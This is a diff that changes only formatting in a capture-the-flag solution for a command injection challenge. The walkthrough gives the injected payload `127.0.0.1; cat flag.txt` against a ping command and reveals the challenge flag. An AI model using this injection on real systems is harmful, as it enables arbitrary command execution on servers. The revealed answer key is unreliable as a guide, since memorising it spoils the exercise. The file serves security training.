@@ -1,9 +1,9 @@
-**Solution: A10 - COMMAND INJECTION**
+Solution: A10 - COMMAND INJECTION
 
-**Concept**  
+Concept  
 Arbitrary operating system command injection (RCE).
 
-**Walkthrough**  
+Walkthrough  
 1. Inspect `challenge/app/app.py`.
 2. Notice the shell execution pattern: `ping -c 1 {host}`.
 3. Payload: `127.0.0.1; cat flag.txt`
@@ -13,5 +13,5 @@ Arbitrary operating system command injection (RCE).
    ```
 5. Flag output: `flag{command_injection_rce}`.
 
-**Flag**  
+Flag  
 `flag{command_injection_rce}`
